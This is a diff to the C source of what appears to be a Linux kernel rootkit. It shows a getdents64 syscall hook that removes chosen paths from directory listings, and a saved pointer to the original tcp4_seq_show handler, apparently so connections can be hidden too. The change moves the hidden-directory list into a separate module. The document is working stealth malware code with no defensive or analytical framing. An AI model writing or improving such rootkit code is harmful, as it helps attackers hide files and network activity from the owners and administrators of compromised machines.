@@ -1,7 +1,5 @@
 #include "hide.h"
-
-LIST_HEAD(hidden_dirs_list);
-spinlock_t hidden_dirs_lock = __SPIN_LOCK_UNLOCKED(hidden_dirs_lock);
+#include "hide_api.h"
 
 asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;
 asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
@@ -27,9 +25,6 @@ asmlinkage int notrace getdents64_hook(const struct pt_regs *regs) {
     // Get the pointer to the directory entrues buffer
     struct linux_dirent64 __user *user_dir =
         (struct linux_dirent64 __user *)regs->si;
-
-    // Get the size of the buffer
-    // unsigned int count = (unsigned int)regs->dx;
 
     // Call the original getdents64 syscall, to have the buffer updated
     // Next, we just need to check directories in the buffer,
@@ -82,7 +77,7 @@ asmlinkage int notrace getdents64_hook(const struct pt_regs *regs) {
                 len = snprintf(fullpath, sizeof(fullpath), "%s/%s", dirstr, d->d_name);
             }
 
-            if (len > 0 && len < sizeof(fullpath) && is_hidden(fullpath))
+            if (len > 0 && len < sizeof(fullpath) && hide_contains_str(fullpath))
                 hide = true;
         }
 
